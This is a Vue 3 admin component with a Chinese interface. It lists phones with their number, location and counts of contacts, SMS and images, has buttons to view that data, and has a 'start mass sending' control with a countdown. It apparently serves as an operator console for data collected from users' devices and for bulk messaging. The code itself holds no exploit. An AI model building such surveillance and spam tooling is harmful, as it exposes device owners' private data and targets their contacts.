<template>
  <div>
    <h3>设备列表</h3>
    <el-table :data="devices" v-loading="loading" style="width:100%">
      <el-table-column label="设备信息">
        <template #default="{ row }">
          <div>
            <div>型号：{{ row.model }}</div>
            <div>手机号：{{ row.phone }}</div>
            <div>ID：{{ row.id }}</div>
            <div>登录时间：{{ row.loginTime }}</div>
            <div>位置：{{ row.location }}</div>
          </div>
        </template>
      </el-table-column>

      <el-table-column label="数量">
        <template #default="{ row }">
          <div>通讯录：{{ row.contacts }}</div>
          <div>短信：{{ row.sms }}</div>
          <div>图片：{{ row.images }}</div>
          <div>App：{{ row.apps.length }}</div>
        </template>
      </el-table-column>

      <el-table-column label="已安装APP">
        <template #default="{ row }">
          <span>{{ row.apps.join('、') }}</span>
        </template>
      </el-table-column>

      <el-table-column label="操作">
        <template #default="{ row }">
          <el-button size="small">通讯录</el-button>
          <el-button size="small">短信</el-button>
          <el-button size="small">图片</el-button>
        </template>
      </el-table-column>

      <el-table-column label="功能">
        <template #default="{ row }">
          <el-button size="small" type="danger" @click="deleteDevice(row.id)">删除用户</el-button>
          <el-button size="small" type="primary" @click="startSending(row)">开始群发</el-button>
          <div v-if="row.sending" style="margin-top:4px;">
            <span>倒计时：{{ row.countdown }}s</span>
            <el-button size="mini" @click="pause(row)">暂停</el-button>
            <el-button size="mini" @click="resume(row)">继续</el-button>
            <span v-if="row.countdown === 0">正在发送</span>
          </div>
        </template>
      </el-table-column>
    </el-table>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue'
import http from '@/api/http'

interface Device {
  id: string
  model: string
  phone: string
  loginTime: string
  location: string
  contacts: number
  sms: number
  images: number
  apps: string[]
  sending?: boolean
  countdown?: number
  timer?: any
}

const devices = ref<Device[]>([])
const loading = ref(false)

function deleteDevice(id: string) {
  devices.value = devices.value.filter(d => d.id !== id)
}

function startSending(row: Device) {
  row.sending = true
  row.countdown = 300
  row.timer = setInterval(() => {
    if (row.countdown! > 0) {
      row.countdown!--
    } else {
      clearInterval(row.timer)
    }
  }, 1000)
}

function pause(row: Device) {
  if (row.timer) clearInterval(row.timer)
}

function resume(row: Device) {
  if (row.countdown! > 0) {
    row.timer = setInterval(() => {
      if (row.countdown! > 0) {
        row.countdown!--
      } else {
        clearInterval(row.timer)
      }
    }, 1000)
  }
}

onMounted(async () => {
  // 两条测试数据
  devices.value = [
    {
      id: 'D001',
      model: 'iPhone 14 Pro',
      phone: '13800138000',
      loginTime: '2025-09-20 10:00:00',
      location: '北京',
      contacts: 120,
      sms: 45,
      images: 200,
      apps: ['微信', '支付宝', '抖音']
    },
    {
      id: 'D002',
      model: '华为 Mate 50',
      phone: '13900139000',
      loginTime: '2025-09-20 11:30:00',
      location: '上海',
      contacts: 80,
      sms: 30,
      images: 150,
      apps: ['QQ', '淘宝', 'B站']
    }
  ]

  // 同时从后端获取真实数据
  try {
    loading.value = true
    const res = await http.get('/devices')
    devices.value.push(...res.data)
  } catch (e) {
    console.error('获取设备失败', e)
  } finally {
    loading.value = false
  }
})
</script>
<style scoped>
/* 表格整体半透明卡片风格 */
.el-table {
  background: rgba(121, 202, 198, 0.85);
  box-shadow: 0 8px 32px rgba(17, 26, 150, 0.2);
  backdrop-filter: blur(10px);
  border: 1px solid rgba(52, 25, 175, 0.3);
  border-radius: 12px;
}

/* 表头字体加粗，背景透明 */
.el-table th {
  font-weight: bold;
  background: transparent;
  color: #000;
}

/* 表格行字体加粗，背景透明 */
.el-table td {
  font-weight: bold;
  background: transparent;
}

/* 设备信息和数量列里面内容加竖线 */
.device-info span,
.device-count span {
  margin-right: 8px;
}

/* 倒计时按钮区样式 */
.timer {
  margin-top: 4px;
}
</style>